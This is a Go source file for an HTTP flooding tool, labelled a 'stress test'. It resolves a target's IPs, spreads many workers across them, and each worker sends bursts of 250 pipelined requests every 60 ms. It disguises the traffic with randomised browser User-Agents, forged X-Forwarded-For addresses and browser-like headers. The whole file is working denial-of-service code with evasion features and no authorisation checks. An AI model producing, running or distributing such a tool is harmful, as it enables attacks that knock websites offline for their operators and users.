package main

import (
    "bytes"
    "context"
    "crypto/tls"
    "fmt"
    "math/rand"
    "net"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

// Global variables for DNS handling
var (
    ips         []string
    ipsMutex    sync.Mutex
    rebalanceCh = make(chan []string)
)

var (
    httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
    languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
    contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

// StressConfig holds CLI options
type StressConfig struct {
    Target     *url.URL
    Threads    int
    Duration   time.Duration
    CustomHost string
    Port       int
    Path       string
}

func init() {
    rand.Seed(time.Now().UnixNano())
}

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
        os.Exit(1)
    }
    // Parse arguments
    rawURL := os.Args[1]
    threads, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("Invalid thread count:", err)
        os.Exit(1)
    }
    durSec, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("Invalid duration:", err)
        os.Exit(1)
    }
    custom := ""
    if len(os.Args) > 4 {
        custom = os.Args[4]
    }
    parsed, err := url.Parse(rawURL)
    if err != nil {
        fmt.Println("Invalid URL:", err)
        os.Exit(1)
    }
    port := determinePort(parsed)
    path := parsed.RequestURI()

    cfg := StressConfig{
        Target:     parsed,
        Threads:    threads,
        Duration:   time.Duration(durSec) * time.Second,
        CustomHost: custom,
        Port:       port,
        Path:       path,
    }
    // Initial DNS lookup
    addrs, err := lookupIPv4(parsed.Hostname())
    if err != nil {
        fmt.Printf("DNS lookup failed: %v\n", err)
        os.Exit(1)
    }
    updateIPs(addrs)
    fmt.Printf("Resolved IPs: %v\n", addrs)
    // Start DNS refresher
    go dnsRefresh(parsed.Hostname(), 30*time.Second)
    // Run manager
    fmt.Printf("Starting stress test: %s, threads=%d, duration=%v\n", rawURL, threads, cfg.Duration)
    runManager(cfg)
    fmt.Println("Stress test completed.")
}

// workerEntry holds the cancel function for a worker
type workerEntry struct{
    cancel context.CancelFunc
}

// runManager starts and dynamically rebalances workers
func runManager(cfg StressConfig) {
    workers := make(map[string][]workerEntry)
    spawnWorker := func(ip string) {
        ctx, cancel := context.WithCancel(context.Background())
        workers[ip] = append(workers[ip], workerEntry{cancel: cancel})
        go workerLoop(ctx, cfg, ip)
    }
    // initial spawn
    rebalance(getSnapshotIPs(), workers, cfg.Threads, spawnWorker)
    stopTimer := time.After(cfg.Duration)
    for {
        select {
        case <-stopTimer:
            // cancel all
            for _, list := range workers {
                for _, w := range list {
                    w.cancel()
                }
            }
            return
        case newIPs := <-rebalanceCh:
            rebalance(newIPs, workers, cfg.Threads, spawnWorker)
        }
    }
}

// workerLoop is the per-worker goroutine
func workerLoop(ctx context.Context, cfg StressConfig, ip string) {
    ticker := time.NewTicker(60 * time.Millisecond)
    defer ticker.Stop()
    tlsCfg := &tls.Config{ServerName: cfg.Target.Hostname(), InsecureSkipVerify: true}
    endTimer := time.After(cfg.Duration)
    for {
        select {
        case <-ctx.Done():
            return
        case <-endTimer:
            return
        case <-ticker.C:
            sendBurst(cfg, tlsCfg, ip)
        }
    }
}

// rebalance adjusts workers per IP evenly
func rebalance(ipsList []string, workers map[string][]workerEntry, total int, spawn func(string)) {
    n := len(ipsList)
    if n == 0 {
        return
    }
    base, extra := total/n, total%n
    desired := make(map[string]int, n)
    for i, ip := range ipsList {
        desired[ip] = base
        if i < extra {
            desired[ip]++
        }
    }
    // remove defunct IPs
    for ip, list := range workers {
        if _, ok := desired[ip]; !ok {
            for _, w := range list {
                w.cancel()
            }
            delete(workers, ip)
        }
    }
    // spawn or remove
    for ip, want := range desired {
        have := len(workers[ip])
        if have < want {
            for i := 0; i < want-have; i++ {
                spawn(ip)
            }
        } else if have > want {
            for i := 0; i < have-want; i++ {
                w := workers[ip][0]
                w.cancel()
                workers[ip] = workers[ip][1:]
            }
        }
    }
    fmt.Printf("Rebalanced: desired=%v have=%v\n", desired, mapCounts(workers))
}

// worker count map
func mapCounts(workers map[string][]workerEntry) map[string]int {
    m := make(map[string]int)
    for ip, list := range workers {
        m[ip] = len(list)
    }
    return m
}

// getSnapshotIPs returns a thread-safe copy
func getSnapshotIPs() []string {
    ipsMutex.Lock()
    defer ipsMutex.Unlock()
    out := make([]string, len(ips))
    copy(out, ips)
    return out
}

// dnsRefresh updates DNS and signals rebalance
func dnsRefresh(host string, interval time.Duration) {
    ticker := time.NewTicker(interval)
    defer ticker.Stop()
    for range ticker.C {
        addrs, err := lookupIPv4(host)
        if err != nil {
            fmt.Printf("DNS refresh error: %v\n", err)
            continue
        }
        updateIPs(addrs)
        fmt.Printf("Re-resolved IPs: %v\n", addrs)
        rebalanceCh <- addrs
    }
}

// updateIPs safely sets global IPs
func updateIPs(list []string) {
    ipsMutex.Lock()
    ips = list
    ipsMutex.Unlock()
}

// lookupIPv4 resolves to IPv4 strings
func lookupIPv4(host string) ([]string, error) {
    addrs, err := net.LookupIP(host)
    if err != nil {
        return nil, err
    }
    var out []string
    for _, a := range addrs {
        if ip4 := a.To4(); ip4 != nil {
            out = append(out, ip4.String())
        }
    }
    if len(out) == 0 {
        return nil, fmt.Errorf("no IPv4 for %s", host)
    }
    return out, nil
}

// determinePort picks from URL or defaults
func determinePort(u *url.URL) int {
    if p := u.Port(); p != "" {
        if i, err := strconv.Atoi(p); err == nil {
            return i
        }
    }
    if strings.EqualFold(u.Scheme, "https") {
        return 443
    }
    return 80
}

// sendBurst opens a connection and sends multiple requests
func sendBurst(cfg StressConfig, tlsCfg *tls.Config, ip string) {
    address := fmt.Sprintf("%s:%d", ip, cfg.Port)
    conn, err := dialConn(address, tlsCfg)
    if err != nil {
        fmt.Printf("[dial %s] %v\n", ip, err)
        return
    }
    defer conn.Close()
    method := httpMethods[rand.Intn(len(httpMethods))]
    for i := 0; i < 250; i++ {
        hdr, body := buildRequest(cfg, method)
        var bufs net.Buffers
        bufs = append(bufs, []byte(hdr))
        if method == "POST" {
            bufs = append(bufs, body)
        }
        if _, err := bufs.WriteTo(conn); err != nil {
            fmt.Printf("[write %s] %v\n", ip, err)
            return
        }
    }
}

// dialConn for TLS or plain
func dialConn(addr string, tlsCfg *tls.Config) (net.Conn, error) {
    if strings.HasSuffix(addr, ":443") {
        return tls.Dial("tcp", addr, tlsCfg)
    }
    return net.Dial("tcp", addr)
}

// buildRequest crafts HTTP/1.1
func buildRequest(cfg StressConfig, method string) (string, []byte) {
    var buf bytes.Buffer
    hostHdr := cfg.Target.Hostname()
    if cfg.CustomHost != "" {
        hostHdr = cfg.CustomHost
    }
    fmt.Fprintf(&buf, "%s %s HTTP/1.1\r\nHost: %s:%d\r\n", method, cfg.Path, hostHdr, cfg.Port)
    writeCommonHeaders(&buf)
    var body []byte
    if method == "POST" {
        ct := contentTypes[rand.Intn(len(contentTypes))]
        body = createBody(ct)
        fmt.Fprintf(&buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body))
    }
    buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
    return buf.String(), body
}

// writeCommonHeaders emits headers
func writeCommonHeaders(buf *bytes.Buffer) {
    buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
    buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
    buf.WriteString(
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
        "Accept-Encoding: gzip, deflate, br, zstd\r\n" +
        "Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\n" +
        "Sec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n" +
        "Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\nX-Forwarded-For: ")
    fmt.Fprintf(buf, "%d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

// createBody random payload
func createBody(ct string) []byte {
    var b bytes.Buffer
    switch ct {
    case "application/x-www-form-urlencoded":
        vals := url.Values{}
        for i := 0; i < 3; i++ {
            vals.Set(randomString(5), randomString(8))
        }
        b.WriteString(vals.Encode())
    case "application/json":
        b.WriteByte('{')
        for i := 0; i < 3; i++ {
            if i > 0 { b.WriteByte(',') }
            fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
        }
        b.WriteByte('}')
    case "text/plain":
        b.WriteString("text_" + randomString(12))
    }
    return b.Bytes()
}

// randomString returns alphanumeric string
func randomString(n int) string {
    letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

// randomUserAgent builds a UA header
func randomUserAgent() string {
    browsers := []string{"Chrome", "Firefox", "Safari", "Edg"}
    osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
    br := browsers[rand.Intn(len(browsers))]
    os := osList[rand.Intn(len(osList))]
    ver := fmt.Sprintf("%d.0.%d", rand.Intn(90)+10, rand.Intn(9999))
    return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s", os, br, ver)
}
